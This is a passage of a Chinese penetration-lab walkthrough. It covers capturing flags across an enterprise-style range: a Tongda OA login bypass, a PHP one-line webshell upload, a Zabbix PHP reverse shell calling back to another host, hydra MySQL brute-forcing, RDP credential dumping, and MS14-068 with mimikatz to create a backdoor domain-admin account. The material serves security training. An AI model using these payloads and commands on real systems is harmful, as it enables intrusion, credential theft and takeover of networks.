+![image-20221110103752593334-1669009374661996.png](img/典型企业生产环境渗透赛 Local.assets/e63c293f8e95a2b2ac341dfbeb75b032.png)
+
+选中新增记录启用代理后点击`Close`。
+
+![image-20211112104540772651-1669009375812133.png](img/典型企业生产环境渗透赛 Local.assets/0be5d1c2e32a77eb67d9458f814bad97.png)
+
+代理启动后回到burpsuite，点击Intercept is off按钮启动拦截。
+
+![image-20211112105258943767-1669009376982114.png](img/典型企业生产环境渗透赛 Local.assets/b3530251e9821eae1df4159d558c234c.png)
+
+在通达OA的登录界面中输入任意用户名和密码，点击`登录`。
+
+![image-20221110104246127100-1669009378194247.png](img/典型企业生产环境渗透赛 Local.assets/7be7d9928c5ba0f86baa5692f396c2a8.png)
+
+回到burpsuite，找到登录动作的包，可通过`Forward`按钮进行查找，包内有账户密码信息。
+
+![image-20221110104302123903-1669009379655256.png](img/典型企业生产环境渗透赛 Local.assets/964acc12f9e79070ffc16004e5f57e0c.png)
+
+点击`Action`>>`Send to Repeater`把这个包发送给`Repeater`，完成后点击`Repeater`。
+
+![image-20221110104326343670-1669009380840867.png](img/典型企业生产环境渗透赛 Local.assets/3a91b867ab1344073900e173753e0304.png)
+
+在Repeater中进行以下修改：
+
+```
+logincheck.php修改为logincheck_code.php
+
+将Cookie:后面的内容删除
+
+在结尾添加&UID=1
+```
+
+![image-20221110104823319682-1669009381984254.png](img/典型企业生产环境渗透赛 Local.assets/87e4de189f67772d6253ddb75b503599.png)
+
+点击`Go`进行发送，在`Response`中获取到session值：
+
+![image-20211112110942818966-1669009383138996.png](img/典型企业生产环境渗透赛 Local.assets/937692b9cacbab51b858bb8b29af7d99.png)
+
+将`set-Cookie`后面的`PHPSESSID`的值（红色字体部分）进行拷贝，选中后右键点击`Copy`。
+
+![image-20211112114245699830-1669009384345246.png](img/典型企业生产环境渗透赛 Local.assets/8191aa48d61d98d80766191136f76886.png)
+
+回到火狐浏览器OA登录界面，找到`Cookies Manager+`并点击。
+
+![image-20221110105224925080-1669009385498446.png](img/典型企业生产环境渗透赛 Local.assets/14e69252d1fb11cebc983f003f65171c.png)
+
+选中`Domain`为`192.168.12.55`，`Name`为`PHPSESSID`的记录，点击`Edit`：
+
+![image-20211112114639098415-1669009386779430.png](img/典型企业生产环境渗透赛 Local.assets/32014377608b950c19c221a435f7d439.png)
+
+将`Content`的内容进行替换，替换为之前拷贝的红色字体部分，完成后点击`Save`进行保存，完成后点击`Close`。
+
+![image-20211112114808110667-1669009387997390.png](img/典型企业生产环境渗透赛 Local.assets/fc2387bf05398d002e49019ff838a4ac.png)
+
+burpsuite关闭拦截：
+
+![image-20221111095229456264-1669009389189492.png](img/典型企业生产环境渗透赛 Local.assets/593caecff770b55969f23c8179d45b78.png)
+
+火狐浏览器切换代理模式：
+
+![image-20221111095449233907-1669009390389358.png](img/典型企业生产环境渗透赛 Local.assets/72903f910657c77b5fa079a48bf69842.png)
+
+在火狐浏览器中打开新的标签页，输入`http://192.168.12.55/general`进行访问，发现登录到后台：
+
+![image-20221111095532932713-1669009391562520.png](img/典型企业生产环境渗透赛 Local.assets/1f0005f7f5dc45bfb066e61682c8e289.png)
+
+##### 任务7：OAgetshell(T1072 - 利用第三方软件部署工具、T1098 - 账户修改、监控)
+
+```
+本场景的第7个任务是利用OA服务器的文件上传漏洞获取主机命令执行权限。
+
+上传文件的时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本等。导致网站甚至整个服务器被控制，恶意的脚本文件又称为WebShell，WebShell具有强大的功能，如查看服务器目录、执行系统命令等。
+
+该任务可以通过以下操作完成。
+```
+
+OA后台界面中点击`系统管理`>>`附件管理`，进入`添加存储目录`界面，`标识ID`，`描述`设置为`123`；根据提示可知网站根目录，目录填入`C:/MYOA/webroot/`，勾选`将所有新附件存至该目录`，配置完成后点击`添加`。
+
+![image-20211112135159402419-1669009392907797.png](img/典型企业生产环境渗透赛 Local.assets/aff764e6bbfc87d795356d75f977a6ff.png)
+
+添加完成后点击`返回`；在桌面新建文本文档，将一句话木马复制粘贴到文本文档后重命名为`shell.php`文件，一句话木马内容如下：
+
+```
+<?php @eval($_POST[cmd]);?>
+```
+
+![image-20211112154542357773-1669009394099811.png](img/典型企业生产环境渗透赛 Local.assets/713ffacb08c7d850962b9ea753361199.png)
+
+回到OA后台，点击`组织`>>`系统管理员`，弹出对话框。
+
+![image-20211112140137940026-1669009395276413.png](img/典型企业生产环境渗透赛 Local.assets/85ffdd07a24132ee090466114b0ec03e.png)
+
+开启浏览器本地代理，burpsuite开启拦截。
+
+![image-20211112140326832615-1669009396448697.png](img/典型企业生产环境渗透赛 Local.assets/8ffbb91209002dc355d8a603eb6f7579.png)
+
+在系统管理员对话框上传木马文件：
+
+![image-20211112140811605448-1669009397589244.png](img/典型企业生产环境渗透赛 Local.assets/8b373653e7b1cacd0bf960f9eda32944.png)
+
+在burpsuite中点击`Forward`查找上传动作的信息：
+
+![image-20211112141452717633-1669009398798942.png](img/典型企业生产环境渗透赛 Local.assets/08c2c8948507169c3b1c6e413fc94c8f.png)
+
+点击`Action`>>`Send to Repeater`发送给`Repeater`，进入`Repeater`，修改`filename="shell.php"`为` filename="shell.php."`，完成后点击`Go`。
+
+![image-20211112141733141842-1669009399980961.png](img/典型企业生产环境渗透赛 Local.assets/0572035d323c4a55aab9e8282409e7e3.png)
+
+返回的响应如下：
+
+![image-20221110111338799458-1669009401193498.png](img/典型企业生产环境渗透赛 Local.assets/6a747c06ce2d85abce8729b88f6c337f.png)
+
+根据`state`参数为`SUCCESS`判断webshell上传成功，其路径可能和`url`参数有关，在`url`参数中发现引用`id`参数和`MODULE`参数，猜测webshel上传到`im`目录或其子目录下并与`YM`参数（年月）有关，尝试拼接webshell路径：
+
+```
+http://192.168.12.55/im/YM=后面的值/id参数下划线后面的值.shell.php
+```
+
+![image-20221110112953720989-1669009402480306.png](img/典型企业生产环境渗透赛 Local.assets/3677a14b9925f8eaad5b2fe9722e1ad1.png)
+
+蚁剑中添加shell：
+
+```
+shell url:
+
+http://192.168.12.55/im/YM=后面的值/id参数下划线后面的值.shell.php
+
+shell pwd:
+
+cmd
+```
+
+![image-20221110113426889148-1669009403711873.png](img/典型企业生产环境渗透赛 Local.assets/301050148c6f61e37eda4c238f5ef72e.png)
+
+点击`Add`完成添加，选中该URL右键点击`>_ Terminal`进入终端，执行命令查看当前用户权限：
+
+```
+whoami
+```
+
+![image-20221110113701009660-1669009404926730.png](img/典型企业生产环境渗透赛 Local.assets/c99550c7d75cd98ca0b9913637413410.png)
+
+查看用户信息：
+
+![image-20221110113752119510-1669009406108608.png](img/典型企业生产环境渗透赛 Local.assets/dde74a472877836be3f16e751573c47b.png)
+
+尝试修改Administrator账户密码：
+
+```
+net user Administrator qwer1234
+```
+
+![image-20221110113829720980-1669009407309068.png](img/典型企业生产环境渗透赛 Local.assets/1e1bab6cfe65eb16cf8557acad1886c7.png)
+
+修改成功后通过远程桌面进行连接：
+
+![image-20211112173115720143-1669009408481371.png](img/典型企业生产环境渗透赛 Local.assets/8f261587ed26d8ec9cade9f94be84981.png)
+
+远程主机地址`192.168.12.55`，登录信息`Administrator/qwer1234`：
+
+![image-20211112215213430461-1669009409625018.png](img/典型企业生产环境渗透赛 Local.assets/2e151bd67eee5cc6c3f66dd078b3223b.png)
+
+在桌面发现`flag.txt`文件：
+
+![image-20221110133329578720-1669009410816634.png](img/典型企业生产环境渗透赛 Local.assets/07813314d8a915bb3e79e97076325e0e.png)
+
+```
+flag{32D3-0BA4-076B-FE71-A6E8-0960-84AA-4F5F}
+```
+
+##### 任务8：Zabbix目录扫描(T1595 - 主动扫描)
+
+```
+本场景的第8个任务是通过工具zabbix服务器进行目录扫描，获取敏感信息。
+
+dirsearch是一个python开发的目录扫描工具，目的是扫描网站的敏感文件和目录从而找到突破口。
+
+该任务可以通过以下操作完成。
+```
+
+主机`192.168.12.50`开放80端口，在`Win10_tools`主机中通过火狐浏览器进行访问，切换代理模式：
+
+![image-20221110134916233866-1669009412015170.png](img/典型企业生产环境渗透赛 Local.assets/35b4e71533a554550b6980f14d40e7a1.png)
+
+访问成功：
+
+![image-20221110134413967577-1669009413213988.png](img/典型企业生产环境渗透赛 Local.assets/c5c4cdfd28e7ba76c43cab15352dd236.png)
+
+进入`C:\Users\Administrator\AppData\Local\Rolan\information gathering\dirsearch-master`目录，在地址栏输入cmd并回车启动命令行，输入命令对目标主机进行目录扫描：
+
+```
+python3 dirsearch.py -u 192.168.12.50 -e *
+```
+
+![image-20221121101137766398-1669009414420006.png](img/典型企业生产环境渗透赛 Local.assets/1082f234d496513979c81704b7815460.png)
+
+发现zabbix目录，回到`Win10_tools`主机通过火狐浏览器访问`http://192.168.12.50/zabbix`：
+
+![image-20211015161513320138-1669009415566210.png](img/典型企业生产环境渗透赛 Local.assets/ffc19407d3000eb0a7f05f745b3270cd.png)
+
+成功访问到zabbix的登录界面，尝试`Admin/zabbix`弱口令进行登录，登录成功：
+
+![image-20211015161636563707-1669009416804121.png](img/典型企业生产环境渗透赛 Local.assets/d5fd47701d2d4c57da06d30b9bfbf411.png)
+
+##### 任务9：Zabbix反弹shell(T1203 - 利用客户端漏洞获取执行权限)
+
+```
+本场景的第9个任务是对Zabbix服务器进行渗透测试，获取命令执行权限。
+
+zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。
+
+该任务可以通过以下操作完成。
+```
+
+进入`C:\Users\Administrator\AppData\Local\Rolan\Intranet`目录，将`nc64.exe`文件复制粘贴到`192.168.12.55`主机的远程桌面中：
+
+![image-20221110135649811982-1669009417964644.png](img/典型企业生产环境渗透赛 Local.assets/7894bb3cd3a58c806db346a85cdc4d88.png)
+
+远程桌面中启动命令行：
+
+![image-20221110135734461053-1669009419129545.png](img/典型企业生产环境渗透赛 Local.assets/6ed61e6044930904bc75116d9725d7b2.png)
+
+执行命令建立监听：
+
+```
+cd Desktop //进入桌面
+
+nc64.exe -lvvp 6666  //监控6666端口
+```
+
+![image-20211114140105436174-1669009420425138.png](img/典型企业生产环境渗透赛 Local.assets/3ef8eda4f6c7a34957e1bad9832f730b.png)
+
+回到浏览器的zabbix界面，点击`Administration`>>`Scripts`>>`Create Script`。
+
+![image-20211114141425616852-1669009421544307.png](img/典型企业生产环境渗透赛 Local.assets/4ae8578a2e4688d024fa0ee9d1ef6649.png)
+
+将反弹shell写入：
+
+```
+php -r '$sock=fsockopen("192.168.12.55",6666);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+![image-20211114143031325891-1669009422718294.png](img/典型企业生产环境渗透赛 Local.assets/f702150e4b230238cf1d0f47e9825235.png)
+
+点击`Add`进行添加；添加完成后点击`Monitoring`>>`Lastest data`。
+
+![image-20211114143327396397-1669009423880187.png](img/典型企业生产环境渗透赛 Local.assets/8489e0158b5669820ec5ce7aa968289f.png)
+
+点击`Host groups`后面的`Select`，勾选`Name`项进行全选，完成后点击`Select`。
+
+![image-20211114143500445443-1669009425044564.png](img/典型企业生产环境渗透赛 Local.assets/5c20d4f62ae10c9e8a3201f669a1f3e5.png)
+
+点击`Filter`。
+
+![image-20211114143605876092-1669009426211071.png](img/典型企业生产环境渗透赛 Local.assets/bfba8fbab21499cbc47df2aeb7e4dbef.png)
+
+点击下方第一个`Zabbix Server`>>`shell`。
+
+![image-20211114143846655959-1669009427356195.png](img/典型企业生产环境渗透赛 Local.assets/f254a159c62702c48a0e85637456a13f.png)
+
+完成后回到`192.168.12.55`主机的远程桌面，nc接收到反弹的shell：
+
+![image-20211114144045769370-1669009428528617.png](img/典型企业生产环境渗透赛 Local.assets/1e2594e74b9ba1f3400b1f9f88a23127.png)
+
+获取flag:
+
+```
+cat /home/flag.txt
+```
+
+![image-20221110140830521805-1669009429703162.png](img/典型企业生产环境渗透赛 Local.assets/74baa78e7a7eea3f6d4d40b0ac8719dc.png)
+
+```
+flag{13C5E63F-96827ACF-8390EF9D-F1BB7CF1}
+```
+
+##### 任务10：mysql密码爆破(T1110 - 暴力破解)
+
+```
+本场景的第10个任务是通过工具对Zabbix数据库进行密码爆破，收集数据库信息。
+
+hydra是一个网络帐号破解工具，支持多种协议。其作者是van Hauser,David Maciejak与其共同维护。hydra在所有支持GCC的平台能很好的编译，包括Linux,所有版本的BSD,Mac OS, Solaris等。
+
+该任务可以通过以下操作完成。
+```
+
+主机`192.168.12.50`开放3306端口，疑似mysql数据库，尝试破解登录；
+
+进入`Kali_tools`主机的`/root/Desktop/tools/Hydra/`目录，将之前获取到的账户密码信息进行写入；在`user.txt`文件中新增`root`和`zabbix`记录并保存。
+
+![image-20221121113305260183-1669009430847842.png](img/典型企业生产环境渗透赛 Local.assets/4ef7c1230d6cf445bf65a28c11a19aad.png)
+
+在`passwd.txt`文件中新增`hy123QWE!`和`cms123cms`记录并保存。
+
+![image-20221121113248742632-1669009432032176.png](img/典型企业生产环境渗透赛 Local.assets/352ba9ede7258e3a00d3fc3756b36101.png)
+
+在`/root/Desktop/tools/Hydra/`目录中右键空白处点击`Open Terminal Here`打开终端，输入命令开始爆破：
+
+```
+proxychains4 hydra -L 'user.txt' -P 'passwd.txt' 192.168.12.50 mysql
+```
+
+爆破出mysql账户密码信息：
+
+![image-20221121113223245477-1669009433166396.png](img/典型企业生产环境渗透赛 Local.assets/f7393466fd6bfad2bd6b90612130edd0.png)
+
+获取到数据库的账户密码后远程连接mysql：
+
+```
+proxychains4 mysql -u root -phy123QWE! -h 192.168.12.50
+```
+
+![image-20221121113345908494-1669009434340611.png](img/典型企业生产环境渗透赛 Local.assets/07fedf4494854fd1ce6d158e0e70380b.png)
+
+连接成功后查看数据库：
+
+```
+show databases;
+```
+
+![image-20211114161735645350-1669009435498156.png](img/典型企业生产环境渗透赛 Local.assets/e2b5f78efb0b3f4e4509b76c0fb6ca29.png)
+
+发现zabbix数据库，进入zabbix：
+
+```
+use zabbix;
+```
+
+![image-20211114161837363335-1669009436624984.png](img/典型企业生产环境渗透赛 Local.assets/cf00264e05b0c1c8cfefe3c4bdce783e.png)
+
+查看表名，发现flag表：
+
+```
+show tables;
+```
+
+![image-20211114162002679759-1669009437922245.png](img/典型企业生产环境渗透赛 Local.assets/decd64a2647eab852d2e0af00e505dd4.png)
+
+读取flag：
+
+```
+select * from flag;
+```
+
+![image-20221111142231237170-1669009439101006.png](img/典型企业生产环境渗透赛 Local.assets/b4ab21bd5b71a1de3573be4d41c53c9b.png)
+
+```
+flag{97062052-AC19D949-C26E79F5-E8FC6CE9}
+```
+
+##### 任务11：域用户密码获取(T1078 - 有效凭证)
+
+```
+本场景的第11个任务是通过RDP密码破解工具获取域内用户的密码信息。
+
+RDP(Remote Desktop Protocol)称为“远程桌面登录协议”，即当某台计算机开启了远程桌面连接功能后（在windows系统中这个功能是默认打开的），我们就可以在网络的另一端控制这台机器了。通过远程桌面功能，我们可以实时地操作这台计算机，在上面安装软件，运行程序，所有的一切都好像是直接在该计算机上操作一样。
+
+该任务可以通过以下操作完成。
+```
+
+回到`Win10_tools`主机，查看`192.168.12.55`主机的远程连接记录：
+
+![image-20211114170501555586-1669009440278457.png](img/典型企业生产环境渗透赛 Local.assets/c8100ff4cf3729d9bff87a5f19959781.png)
+
+发现主机远程记录：
+
+![image-20211114175852539304-1669009441466258.png](img/典型企业生产环境渗透赛 Local.assets/3dd8a48f7d0c38375855317944421bca.png)
+
+尝试读取该凭证信息，将`Win10_tools`主机`C:\Users\Administrator\AppData\Local\Rolan\Intranet\`目录下的`get_rdp_pass_x64`文件夹复制粘贴到`192.168.12.55`主机的远程桌面中：
+
+![image-20221110150605815778-1669009442600053.png](img/典型企业生产环境渗透赛 Local.assets/71faf1c179f259511577ad95b8af1708.png)
+
+在`get_rdp_pass_x64`目录下启动命令行执行命令获取凭证信息：
+
+```
+get_rdp_pass.bat
+```
+
+![image-20211114181348542061-1669009443765878.png](img/典型企业生产环境渗透赛 Local.assets/0d3b27cf1843e3abe3b0233569065884.png)
+
+在远处桌面连接窗口中点击`Connect`进行登录：
+
+![image-20211114181528243580-1669009444903668.png](img/典型企业生产环境渗透赛 Local.assets/442ac65018546f3c7c0272ed19f43a87.png)
+
+登录成功后获取flag：
+
+![image-20221111101840409465-1669009446063172.png](img/典型企业生产环境渗透赛 Local.assets/1fc5da95fe775e4f07791d6bf47cf487.png)
+
+```
+flag{22790CE4-0464FA49-E0FA0DC6-372A7D7D}
+```
+
+进行信息收集，查看电脑属性发现存在域环境：
+
+![image-20211114181804964206-1669009447242555.png](img/典型企业生产环境渗透赛 Local.assets/086fa18b096382e44f4bd982e84ad4a4.png)
+
+#### 阶段三：生产区渗透测试
+
+##### 任务12：域内信息收集(T1592 - 收集目标主机信息)
+
+```
+本场景的第12个任务是通过域内用户信息登录域内主机，使用命令获取域内主机敏感信息。
+
+Windows域是计算机网络的一种形式，其中所有用户帐户，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。身份验证在域控制器上进行。在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。从Windows Server 2003开始，Active Directory是负责维护该中央数据库的Windows组件。Windows域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。
+
+该任务可以通过以下操作完成。
+```
+
+启动命令行：![image-20211114182419029060-1669009448357706.png](img/典型企业生产环境渗透赛 Local.assets/9859f4f82bb2af70d7b050a65b0dba4d.png)
+
+查看域环境：
+
+```
+net config workstation
+```
+
+![image-20211114182615826463-1669009449545156.png](img/典型企业生产环境渗透赛 Local.assets/c7bfc8128f5a5ab67760cf1b86b401cd.png)
+
+查找域控主机名：
+
+```
+nltest /dsgetdc:cyber123
+```
+
+![image-20211114182819293134-1669009450695019.png](img/典型企业生产环境渗透赛 Local.assets/cea7e23debc81f692884ee782339a3df.png)
+
+获取到域控主机名`SCENE`及其地址`192.168.14.101`，查看域内主机信息：
+
+```
+net view /domain:cyber123
+```
+
+![image-20221110151348640261-1669009451890170.png](img/典型企业生产环境渗透赛 Local.assets/7855c0825a304a30461387fc8a2c26af.png)
+
+域内共3台主机，获取`User3`主机地址：
+
+```
+ping USER3
+```
+
+![image-20211114183124357647-1669009453158201.png](img/典型企业生产环境渗透赛 Local.assets/9d86a8d43e645efb43e16cd9abc74802.png)
+
+##### 任务13：域普通用户提权(T1078 - 有效凭证、T1136 - 创建账户)
+
+```
+本场景的第13个任务是利用漏洞将域内普通用户的权限提升到域管理员权限。
+
+MS14-068漏洞说明：该漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。
+
+该任务可以通过以下操作完成。
+```
+
+检查是否存在MS14-068漏洞：
+
+```
+systeminfo |find "3011780"   
+```
+
+![image-20211114183446907328-1669009454325061.png](img/典型企业生产环境渗透赛 Local.assets/58114e2f36265545ea90f515c0bfb9bd.png)
+
+没有回显表示未打补丁，查看当前用户是否有域管权限：
+
+```
+dir \\scene.cyber123.com\c$
+```
+
+![image-20211114184139267490-1669009455496781.png](img/典型企业生产环境渗透赛 Local.assets/50d1b99216f36c3044ee48af80598096.png)
+
+权限不足，将`Win10_tools`主机`C:\Users\Administrator\AppData\Local\Rolan\Intranet`目录下的`MS14-068.exe`文件和`mimikatz.exe`文件复制粘贴到`192.168.14.51`的远程桌面中：
+
+![image-20221110152935005336-1669009456641593.png](img/典型企业生产环境渗透赛 Local.assets/55c77d672937f20e76b679128a167375.png)
+
+查看当前用户SID：
+
+```
+whoami /user
+```
+
+![image-20211114184555272621-1669009457794628.png](img/典型企业生产环境渗透赛 Local.assets/3c565d0ce02fdbf1093ee2b0b14008df.png)
+
+使用提权工具进行提权：
+
+```
+cd Desktop  //进入工具所在目录
+
+MS14-068.exe -u LL@cyber123.com -p Llyoyo123# -s S-1-5-21-2718660907-658632824-2072795563-1104 -d scene.cyber123.com  //生成凭据
+```
+
+![image-20211114185513611380-1669009458970314.png](img/典型企业生产环境渗透赛 Local.assets/fe0430b3829ecc6fcbe18a149a99bfaf.png)
+
+生成的凭证保存在桌面：
+
+![image-20221111102113815513-1669009460107628.png](img/典型企业生产环境渗透赛 Local.assets/9e4fc9858605dc13cbb094dc7d86e7c6.png)
+
+双击`mimikatz.exe`文件运行工具，清空凭证：
+
+```
+kerberos::purge
+```
+
+![image-20211114190736167734-1669009461482480.png](img/典型企业生产环境渗透赛 Local.assets/48cdae33fa4c5336964a588190a12a14.png)
+
+通过拖拽文件的方式导入伪造的凭证：
+
+```
+kerberos::ptc 凭证的绝对路径
+```
+
+![image-20221110153402541062-1669009462652846.png](img/典型企业生产环境渗透赛 Local.assets/6b27c185452bd60d492f6482b5971213.png)
+
+![image-20221110153417058569-1669009463802079.png](img/典型企业生产环境渗透赛 Local.assets/fe5432654f0204cce5768e81f352d230.png)
+
+在命令行中再次执行`dir \\scene.cyber123.com\c$`，出现回显表示提权成功：
+
+![image-20211114191340005032-1669009464978070.png](img/典型企业生产环境渗透赛 Local.assets/56a5e0b0a4fc0be1c94267320740854d.png)
+
+添加域管用户，命令行中执行命令：
+
+```
+net user aaa Qwer1234... /add /domain  //创建域管用户
+```
+
+![image-20211114191706988293-1669009466084910.png](img/典型企业生产环境渗透赛 Local.assets/c2df41fac313db8a04152e512a3fd3ce.png)
+
+```
+net group "Domain Admins" aaa /add /domain   //加入域管组
+```
+
+![image-20211114191914254572-1669009467340985.png](img/典型企业生产环境渗透赛 Local.assets/0c7d3c7ecb3ea8934c55078ee4f53b61.png)
+
+启动远程桌面，使用aaa账户远程登录域控主机`192.168.14.101`：
+
+![image-20221110153956753053-1669009468560826.png](img/典型企业生产环境渗透赛 Local.assets/f2cac826496cd93d034a1749e12687a6.png)
+
+登录成功后查看`Administrator`用户的文件信息：
+
+![image-20221110154241280138-1669009469704246.png](img/典型企业生产环境渗透赛 Local.assets/51ff6ff184b80268d39d84bb639a64f7.png)
+
+在其桌面文件夹发现flag：
+
+![image-20221110154314677219-1669009471064160.png](img/典型企业生产环境渗透赛 Local.assets/5fa78c1a0219a36df316497690f062ed.png)
+
+```
+flag{3835-58B6-3FF2-341D-7E69-11D6-4539-C916}
+```
+
+关闭`192.168.14.101`主机的远程连接：
+
+![image-20221111102513318194-1669009472192014.png](img/典型企业生产环境渗透赛 Local.assets/5a9185f676ae7147e0e528c8606d445f.png)
+
+在`192.168.12.51`主机的远程桌面中，使用aaa用户远程登录`192.168.14.53`主机；登录成功后发现SCADA软件：
+
+![image-20221110154846086577-1669009473370768.png](img/典型企业生产环境渗透赛 Local.assets/f40d13007b66b63426ab58b18d591d7a.png)
+
+在`Administrator`用户的桌面文件夹中发现flag：
+
+![image-20221110154929855276-1669009474529124.png](img/典型企业生产环境渗透赛 Local.assets/987c46c76bb7d8b32613622466556afe.png)
+
+```
+flag{ECEA-FE1E-F62C-FDFB-450C-CF01-D9A1-6939}
+```
+
+##### 任务14：SCADA工程恢复(T1105 - 远程文件拷贝、T1021 - 远程服务)
+
+```
+本场景的第14个任务是通过信息收集技术获取SCADA工程备份文件并恢复。
+
+SCADA(Supervisory Control And Data Acquisition)系统，即数据采集与监视控制系统。SCADA系统是以计算机为基础的DCS与电力自动化监控系统；它应用领域很广，可以应用于电力、冶金、石油、化工、燃气、铁路等领域的数据采集与监视控制以及过程控制等诸多领域。
+
+该任务可以通过以下操作完成。
+```
+
+在`192.168.14.51`主机的远程桌面中进行信息收集，查看`Administrator`用户的文件信息：
+
+![image-20221110160129369417-1669009475854640.png](img/典型企业生产环境渗透赛 Local.assets/6d96ba32485821483c3efea2f9543b54.png)
+
+使用aaa域管用户的凭证信息：
+
+![image-20221110160202503834-1669009477033569.png](img/典型企业生产环境渗透赛 Local.assets/3613bd5983bd6c27684145e674569f08.png)
+
+在`Administrator`用户的`Downloads`目录下发下工程文件包：
+
+![image-20221110160254305412-1669009478142744.png](img/典型企业生产环境渗透赛 Local.assets/5492ec4787f0bf2e983932ce0419f9fa.png)
+
+将该文件拷贝到`192.168.14.53`主机的远程桌面中：
+
+![image-20221110160331207891-1669009479309379.png](img/典型企业生产环境渗透赛 Local.assets/61ac227a7cd38bb1e79c43bef57a15c9.png)
+
+双击SCADA软件，点击`恢复`：
+
+![image-20221110160410477533-1669009480664258.png](img/典型企业生产环境渗透赛 Local.assets/07cb1f5c4b78a73cfd5ec5340ac4dda5.png)
+
+选中`Project.PCZ`文件进行恢复，存储路径设置为桌面：
+
+![image-20221110161535738857-1669009481796307.png](img/典型企业生产环境渗透赛 Local.assets/516a43258cf42b2488ebd53400c0f3f7.png)
+
+![image-20221111103510929939-1669009482955701.png](img/典型企业生产环境渗透赛 Local.assets/f4d44a17e0f698b3409af3eec37fa7a7.png)
+
+通过弱口令`admin`恢复成功：
+
+![image-20221110161647621836-1669009484173796.png](img/典型企业生产环境渗透赛 Local.assets/0eedead59a5bb5149ffe35760f1e8203.png)
+
+选中工程后点击`运行`
+
+![image-20221110161703666190-1669009485339618.png](img/典型企业生产环境渗透赛 Local.assets/9bc85848f891abe184c2c4d2e8e72b43.png)
+
+![image-20221110161724613250-1669009486503196.png](img/典型企业生产环境渗透赛 Local.assets/1812e46f3f2371db1ef2033b89d00c41.png)
+
+![image-20221110161741099336-1669009487624450.png](img/典型企业生产环境渗透赛 Local.assets/7982e31cbb3c6e5b67328eeaf20152e9.png)
+
+![image-20221110161758270741-1669009488781954.png](img/典型企业生产环境渗透赛 Local.assets/a7ab51a4cb772ae2e30c29e332aff7e5.png)
+
+获取flag：
+
+![image-20221110161817605082-1669009489922012.png](img/典型企业生产环境渗透赛 Local.assets/7722eac235a7f19bf0146b62a5894309.png)
+
+```
+flag{00377775-B0EE7DCF-3A23E22C-2CA0EC77}
+```
